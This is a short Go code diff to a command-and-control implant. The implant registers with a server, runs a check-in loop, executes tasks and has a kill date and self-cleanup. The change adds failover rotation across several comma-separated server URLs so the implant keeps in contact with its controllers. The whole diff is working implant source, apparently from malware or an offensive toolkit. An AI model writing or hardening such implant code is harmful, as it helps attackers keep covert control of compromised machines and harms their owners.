@@ -37,8 +37,21 @@ func selfCleanup() {
 // Run is the main entry point for the implant.
 // It handles registration, check-in loop, and task execution.
 func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, killDate string) {
+	// Support comma-separated URLs for failover rotation
+	rawURLs := strings.Split(serverURL, ",")
+	urls := make([]string, 0, len(rawURLs))
+	for _, u := range rawURLs {
+		u = strings.TrimSpace(u)
+		if u != "" {
+			urls = append(urls, u)
+		}
+	}
+	if len(urls) == 0 {
+		urls = []string{serverURL}
+	}
+
 	imp := &Implant{
-		transport: NewTransport(serverURL, serverPub),
+		transport: NewTransport(urls, serverPub),
 		sleep:     sleepSec,
 		jitter:    jitterPct,
 		killDate:  killDate,
